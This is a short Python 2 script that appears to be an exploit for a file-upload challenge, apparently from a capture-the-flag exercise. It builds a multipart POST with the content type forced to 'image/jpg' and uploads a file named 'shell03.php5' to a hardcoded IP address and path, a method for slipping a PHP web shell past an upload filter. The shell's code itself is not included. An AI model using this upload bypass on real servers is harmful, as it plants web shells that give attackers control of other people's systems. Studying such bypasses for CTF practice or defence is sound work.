import httplib, mimetypes

def post_multipart(host, port,selector, fields, files):
     """
     Post fields and files to an http host as multipart/form-data.
     fields is a sequence of (name, value) elements for regular form fields.
     files is a sequence of (name, filename, value) elements for data to be uploaded as files
     Return the server's response page.
     """
     content_type, body = encode_multipart_formdata(fields, files)
     h = httplib.HTTPConnection(host,port)
     headers = {
         'User-Agent': 'mycurl agent 0.9',
         'Content-Type': content_type
         }
     print headers
     print body    
     h.request('POST', selector, body, headers)
     res = h.getresponse()
     return res.status, res.reason, res.read()

def encode_multipart_formdata(fields, files):
     """
     fields is a sequence of (name, value) elements for regular form fields.
     files is a sequence of (name, filename, value) elements for data to be uploaded as files
     Return (content_type, body) ready for httplib.HTTP instance
     """
     BOUNDARY = '----------ThIs_Is_tHe_bouNdaRY_$'
     CRLF = '\r\n'
     L = []
     for (key, value) in fields:
         L.append('--' + BOUNDARY)
         L.append('Content-Disposition: form-data; name="%s"' % key)
         L.append('')
         L.append(value)
     for (key, filename, value) in files:
         L.append('--' + BOUNDARY)
         L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % (key,filename))
         L.append('Content-Type: %s' % get_content_type(filename))
         L.append('')
         L.append(value)
     L.append('--' + BOUNDARY + '--')
     L.append('')
     body = CRLF.join(L)
     content_type = 'Multipart/form-data; boundary=%s' % BOUNDARY
     return content_type, body

def get_content_type(filename):
     #return mimetypes.guess_type(filename)[0] or 'application/octet-stream'
     return 'image/jpg'

files = [('file', 'shell03.php5',open("shell03.php5").read())]
#files = {'file','shell03.gif',open("shell03.gif", "rb")}
s,r,v=post_multipart("120.24.86.145","8002" ,"/web9/", {}, files)
print v